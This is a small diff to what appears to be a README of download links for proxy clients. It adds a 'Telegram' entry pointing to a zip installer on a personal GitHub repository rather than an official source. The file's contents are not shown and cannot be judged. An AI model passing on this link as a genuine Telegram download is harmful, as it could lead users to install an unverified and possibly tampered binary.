@@ -37,6 +37,9 @@
 
 [V2RayN](https://github.com/2dust/v2rayN/releases/latest/download/v2rayN-Core.zip)
 
+[Telegram](https://github.com/xt1085/app/releases/download/app/tsetup.2.0.1.zip)
+
+
 ## Mac
 
 [ClashX](https://github.com/yichengchen/clashX/releases)
